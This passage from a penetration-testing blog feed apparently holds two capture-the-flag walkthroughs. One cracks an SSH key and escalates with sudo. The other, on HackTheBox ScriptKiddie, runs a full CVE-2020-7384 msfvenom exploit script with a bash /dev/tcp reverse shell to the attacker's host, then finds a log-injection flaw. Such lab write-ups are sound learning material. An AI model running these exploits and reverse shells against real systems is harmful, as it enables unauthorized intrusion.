</span></span><span class="line"><span class="cl">3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY
</span></span><span class="line"><span class="cl">-----END RSA PRIVATE KEY-----
</span></span></code></pre></div><h4 id="cracking-id_rsa">Cracking id_rsa</h4>
<p>I&rsquo;ll convert Kay&rsquo;s <code>id_rsa</code> to hash using <code>ssh2john.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ /usr/share/john/ssh2john.py kay_rsa &gt; kay_rsa.hash<span class="p">;</span> cat kay_rsa.hash
</span></span><span class="line"><span class="cl">kay_rsa:<span class="nv">$sshng$1$16$6</span>ABA7DE35CDB65070B92C1F760E2FE75<span class="nv">$2352$22835</span>bfc9d2ad8f779e84676de801a2712e...&lt;SNIP&gt;...
</span></span></code></pre></div><p><code>JtR</code> finds the password to be <code>beeswax</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210530013632605.png" alt="image-20210530013632605"  /></div>
</p>
<h4 id="ssh---kay">SSH - Kay</h4>
<p>Interestingly, Kay&rsquo;s is in the sudo group.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> kay_rsa <span class="o">&amp;&amp;</span> ssh -i kay_rsa kay@10.10.245.112
</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;kay_rsa&#39;</span>: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 16.04.4 LTS <span class="o">(</span>GNU/Linux 4.4.0-119-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">Last login: Mon Apr <span class="m">23</span> 16:04:07 <span class="m">2018</span> from 192.168.56.102
</span></span><span class="line"><span class="cl">kay@basic2:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>kay<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>kay<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>kay<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
</span></span></code></pre></div><p>From here, I only need Kay&rsquo;s password.</p>
<h4 id="su---root">SU - root</h4>
<p>In Kay&rsquo;s home directory, there is a file called <code>pass.bak</code>. It contains the following string:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kay@basic2:~$ cat pass.bak 
</span></span><span class="line"><span class="cl">heresareallystrongpasswordthatfollowsthepasswordpolicy<span class="nv">$$</span>
</span></span></code></pre></div><p>I tried the string as Kay&rsquo;s password on <code>sudo su -</code> and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kay@basic2:~$ sudo su -
</span></span><span class="line"><span class="cl">root@basic2:~# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@basic2:~# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">1017</span> Apr <span class="m">23</span>  <span class="m">2018</span> flag.txt
</span></span></code></pre></div><p>The flag:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Congratulations! You&#39;ve completed this challenge. There are two ways (that I&#39;m aware of) to gain 
</span></span><span class="line"><span class="cl">a shell, and two ways to privesc. I encourage you to find them all!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">If you&#39;re in the target audience (newcomers to pentesting), I hope you learned something. A few
</span></span><span class="line"><span class="cl">takeaways from this challenge should be that every little bit of information you can find can be
</span></span><span class="line"><span class="cl">valuable, but sometimes you&#39;ll need to find several different pieces of information and combine
</span></span><span class="line"><span class="cl">them to make them useful. Enumeration is key! Also, sometimes it&#39;s not as easy as just finding
</span></span><span class="line"><span class="cl">an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
</span></span><span class="line"><span class="cl">in this series). Usually you&#39;ll have to dig deeper to find things that aren&#39;t as obvious, and
</span></span><span class="line"><span class="cl">therefore might&#39;ve been overlooked by administrators.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you&#39;ll send 
</span></span><span class="line"><span class="cl">me a link! I can be reached at josiah@vt.edu. If you&#39;ve got questions or feedback, please reach
</span></span><span class="line"><span class="cl">out to me.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Happy hacking!
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - ScriptKiddie</title>
      <link>https://fahmifj.github.io/hackthebox/scriptkiddie/</link>
      <pubDate>Mon, 14 Jun 2021 07:57:37 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/scriptkiddie/</guid>
      <description>Exploiting exploitation tools and command injection in a log file</description>
      <content:encoded><![CDATA[<p>ScriptKiddie is all about exploiting exploitation tools. It starts by exploiting <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7384">CVE-2020-7384</a>, allows me to gain a foothold by crafting a malicious APK that executes a reverse shell when used as APK template on <code>msfvenom</code>. There is a script which automatically runs a <code>nmap</code> scan against a host from a log file. The script can be exploited by poisoning the log with a reverse shell. For the last part, a sudo privilege on <code>msfconsole</code>  can be leveraged to gain a root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploiting Metasploit CVE-2020-7384</li>
<li>Log poisoning</li>
<li>Sudo exploitation on msfconsole</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li><a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">CVE-2020-7384 PoC</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full port scan with <code>nmap</code> discovers two open ports: SSH on port 22, and UPnP on port 5000</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «scriptkiddie» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport 10.10.10.226 
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-13 20:42 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.226
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.065s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65533</span> resets
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">5000/tcp open  upnp    syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 45.79 seconds
</span></span></code></pre></div><p>With default script scan, <code>nmap</code> identifies that port 5000 is actually a web application hosted using Python.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «scriptkiddie» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nmap -p22,5000 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.226
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-13 20:44 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.226
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.056s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">5000/tcp open  http    Werkzeug httpd 0.16.1 <span class="o">(</span>Python 3.8.5<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Werkzeug/0.16.1 Python/3.8.5
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: k1d<span class="err">&#39;</span><span class="m">5</span> h4ck3r t00l5
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.66 second
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-5000---website">TCP 5000 - Website</h3>
<p>The site provides several online hacking tools.</p>
<p><div class="img-container"><img src="imgs/image-20210614081410024.png" alt="image-20210614081410024"  /></div>
</p>
<p>The <code>nmap</code> tool can be used to scan against itself.</p>
<p><div class="img-container"><img src="imgs/image-20210614081542603.png" alt="image-20210614081542603"  /></div>
</p>
<p>The IP field doesn&rsquo;t accept others inputs except IPv4, so I don&rsquo;t thing it can be abused, but I&rsquo;ll note the <code>nmap</code> version.</p>
<p>The next tool is <code>msfvenom</code>, it can be used to generate a reverse shell binary.  It has three options on the OS: Windows, Linux and Android. There is also a template option, for example, you can embed your payload to Windows&rsquo;s <code>calc.exe</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210614082411239.png" alt="image-20210614082411239"  /></div>
</p>
<p>Somehow, it can only generate payload for Windows and Android.</p>
<p><div class="img-container"><img src="imgs/image-20210614082153746.png" alt="image-20210614082153746"  /></div>
</p>
<p>The payload is available for 5 mins at <code>http://10.10.10.226:5000/static/payloads/[here]</code>.</p>
<p>The last tool is <code>searchsploit</code>, I tried to stack the commands but it returned this message.</p>
<p><div class="img-container"><img src="imgs/image-20210614083303308.png" alt="image-20210614083303308"  /></div>
</p>
<h3 id="finding-tools-vulnerabilities">Finding Tools Vulnerabilities</h3>
<p>I can&rsquo;t get the tools version except for <code>nmap</code>, so I searched some exploits around before the box release date (February 2021) on Exploit-DB  and here is what I found.</p>
<p><div class="img-container"><img src="imgs/image-20210614084800963.png" alt="image-20210614084800963"  /></div>
</p>
<p>And that is probably what I need.</p>
<p>I typed &ldquo;msfvenom&rdquo; on the site too, and the exploit also appeared there.</p>
<p><div class="img-container"><img src="imgs/image-20210614085320477.png" alt="image-20210614085320477"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-kid">Shell as kid</h3>
<h4 id="mfvenom-cve-2020-7384">Mfvenom CVE-2020-7384</h4>
<p>I&rsquo;ll use <a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">this exploit</a>, but I&rsquo;ll change the payload and the template location to my current working directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tempfile</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b32encode</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Change me</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># b32encode to avoid badchars (keytool is picky)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># thanks to @fdellwing for noticing that base64 can sometimes break keytool</span>
</span></span><span class="line"><span class="cl"><span class="c1"># &lt;https://github.com/justinsteven/advisories/issues/2&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload_b32</span> <span class="o">=</span> <span class="n">b32encode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">dname</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;CN=&#39;|echo </span><span class="si">{</span><span class="n">payload_b32</span><span class="si">}</span><span class="s2"> | base32 -d | sh #&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Manufacturing evil apkfile&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;-dname: </span><span class="si">{</span><span class="n">dname</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tmpdir</span> <span class="o">=</span> <span class="s2">&#34;./&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">apk_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="s2">&#34;evil.apk&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">empty_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="s2">&#34;empty&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">keystore_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="s2">&#34;signing.keystore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">storepass</span> <span class="o">=</span> <span class="n">keypass</span> <span class="o">=</span> <span class="s2">&#34;password&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">key_alias</span> <span class="o">=</span> <span class="s2">&#34;signing.key&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="n">empty_file</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">([</span><span class="s2">&#34;zip&#34;</span><span class="p">,</span> <span class="s2">&#34;-j&#34;</span><span class="p">,</span> <span class="n">apk_file</span><span class="p">,</span> <span class="n">empty_file</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">([</span><span class="s2">&#34;keytool&#34;</span><span class="p">,</span> <span class="s2">&#34;-genkey&#34;</span><span class="p">,</span> <span class="s2">&#34;-keystore&#34;</span><span class="p">,</span> <span class="n">keystore_file</span><span class="p">,</span> <span class="s2">&#34;-alias&#34;</span><span class="p">,</span> <span class="n">key_alias</span><span class="p">,</span> <span class="s2">&#34;-storepass&#34;</span><span class="p">,</span> <span class="n">storepass</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                       <span class="s2">&#34;-keypass&#34;</span><span class="p">,</span> <span class="n">keypass</span><span class="p">,</span> <span class="s2">&#34;-keyalg&#34;</span><span class="p">,</span> <span class="s2">&#34;RSA&#34;</span><span class="p">,</span> <span class="s2">&#34;-keysize&#34;</span><span class="p">,</span> <span class="s2">&#34;2048&#34;</span><span class="p">,</span> <span class="s2">&#34;-dname&#34;</span><span class="p">,</span> <span class="n">dname</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">([</span><span class="s2">&#34;jarsigner&#34;</span><span class="p">,</span> <span class="s2">&#34;-sigalg&#34;</span><span class="p">,</span> <span class="s2">&#34;SHA1withRSA&#34;</span><span class="p">,</span> <span class="s2">&#34;-digestalg&#34;</span><span class="p">,</span> <span class="s2">&#34;SHA1&#34;</span><span class="p">,</span> <span class="s2">&#34;-keystore&#34;</span><span class="p">,</span> <span class="n">keystore_file</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                       <span class="s2">&#34;-storepass&#34;</span><span class="p">,</span> <span class="n">storepass</span><span class="p">,</span> <span class="s2">&#34;-keypass&#34;</span><span class="p">,</span> <span class="n">keypass</span><span class="p">,</span> <span class="n">apk_file</span><span class="p">,</span> <span class="n">key_alias</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Done! apkfile is at </span><span class="si">{</span><span class="n">apk_file</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Do: msfvenom -x </span><span class="si">{</span><span class="n">apk_file</span><span class="si">}</span><span class="s2"> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>It produces a file called <code>evil.apk</code> and it also shows the exploit commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ python3 exploit_msfvenom.py
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Manufacturing evil apkfile
</span></span><span class="line"><span class="cl">Payload: bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;</span>
</span></span><span class="line"><span class="cl">-dname: <span class="nv">CN</span><span class="o">=</span><span class="s1">&#39;|echo MJQXG2BAFVRSAITCMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRGAXDCMBOGE2C4MZRF44TAMBQEAYD4JRREI====== | base32 -d | sh #
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">  adding: empty (stored 0%)
</span></span></span><span class="line"><span class="cl"><span class="s1">jar signed.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">Warning:
</span></span></span><span class="line"><span class="cl"><span class="s1">The signer&#39;</span>s certificate is self-signed.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Done! apkfile is at ./evil.apk
</span></span><span class="line"><span class="cl">Do: msfvenom -x ./evil.apk -p android/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o /dev/null
</span></span></code></pre></div><h4 id="reverse-shell---kid">Reverse shell - kid</h4>
<p>I&rsquo;ll setup a <code>nc</code> listener on port 9000, then I&rsquo;ll upload the <code>evil.apk</code> file as the template file and then I&rsquo;ll click on the generate button.</p>
<p><div class="img-container"><img src="imgs/image-20210614103158432.png" alt="image-20210614103158432"  /></div>
</p>
<p>On my listener, I&rsquo;ve a shell now as user <code>kid</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> root@kali «exploits» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.226<span class="o">]</span> <span class="m">34230</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>897<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$    
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210614102941088.png" alt="image-20210614102941088"  /></div>
</p>
<h4 id="shell-upgrade">Shell upgrade</h4>
<p>I&rsquo;ll upgrade my shell first.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$ which python
</span></span><span class="line"><span class="cl">which python
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">10652</span> suspended  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">10652</span> continued  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$ 
</span></span></code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~/html$ <span class="nb">cd</span> ~
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">60</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> kid  kid   <span class="m">807</span> Feb <span class="m">25</span>  <span class="m">2020</span> .profile
</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> kid  kid  <span class="m">4096</span> Feb <span class="m">10</span> 16:11 .ssh
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> kid  kid     <span class="m">0</span> Jan  <span class="m">5</span> 11:10 .sudo_as_admin_successful
</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">5</span> kid  kid  <span class="m">4096</span> Feb  <span class="m">3</span> 11:03 html
</span></span><span class="line"><span class="cl">drwxrwxrwx  <span class="m">2</span> kid  kid  <span class="m">4096</span> Feb  <span class="m">3</span> 07:40 logs
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> kid  kid  <span class="m">4096</span> Feb  <span class="m">3</span> 11:48 snap
</span></span><span class="line"><span class="cl">-r--------  <span class="m">1</span> kid  kid    <span class="m">33</span> Jun <span class="m">12</span> 11:35 user.txt
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-pwn">Shell as pwn</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>On kid&rsquo;s home, there&rsquo;s a folder called <code>logs</code>. The <code>logs</code> folder contains one file called <code>hackers</code>, but the content is empty.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~/logs$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxrwxrwx  <span class="m">2</span> kid kid <span class="m">4096</span> Feb  <span class="m">3</span> 07:40 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">11</span> kid kid <span class="m">4096</span> Feb  <span class="m">3</span> 11:49 ..
</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> kid pwn    <span class="m">0</span> Jun <span class="m">14</span> 01:40 hackers
</span></span></code></pre></div><p>I did a quick check on the available users who have shells.  It looks like I need to escalate to <code>pwn</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~$ cat /etc/passwd <span class="p">|</span> grep sh$
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">kid:x:1000:1000:kid:/home/kid:/bin/bash
</span></span><span class="line"><span class="cl">pwn:x:1001:1001::/home/pwn:/bin/bash
</span></span></code></pre></div><p>Searching files owned by user <code>pwn</code> discovers one script called <code>scanlosers.sh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~$ find / -type f -user pwn 2&gt;/dev/null
</span></span><span class="line"><span class="cl">/home/pwn/.bash_logout
</span></span><span class="line"><span class="cl">/home/pwn/.selected_editor
</span></span><span class="line"><span class="cl">/home/pwn/.bashrc
</span></span><span class="line"><span class="cl">/home/pwn/.profile
</span></span><span class="line"><span class="cl">/home/pwn/scanlosers.sh
</span></span></code></pre></div><p>The script is writable by me.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~$ ls -l /home/pwn/scanlosers.sh
</span></span><span class="line"><span class="cl">-rwxrwxr-- <span class="m">1</span> pwn pwn <span class="m">250</span> Jan <span class="m">28</span> 17:57 /home/pwn/scanlosers.sh
</span></span></code></pre></div><h4 id="script-analysis">Script analysis</h4>
<p>The script is most likely linked with kid&rsquo;s hack tools website and probably can be abused by stacking commands, but I need to find how the log in <code>hackers</code> file is formatted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Define log</span>
</span></span><span class="line"><span class="cl"><span class="nv">log</span><span class="o">=</span>/home/kid/logs/hackers 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home/pwn/
</span></span><span class="line"><span class="cl">cat <span class="nv">$log</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> ip<span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">    sh -c <span class="s2">&#34;nmap --top-ports 10 -oN recon/</span><span class="si">${</span><span class="nv">ip</span><span class="si">}</span><span class="s2">.nmap </span><span class="si">${</span><span class="nv">ip</span><span class="si">}</span><span class="s2"> 2&gt;&amp;1 &gt;/dev/null&#34;</span> <span class="p">&amp;</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span><span class="line"><span class="cl"><span class="c1">## The log is cleared immediately</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>wc -l &lt; <span class="nv">$log</span><span class="k">)</span> -gt <span class="m">0</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> -n &gt; <span class="nv">$log</span><span class="p">;</span> <span class="k">fi</span>
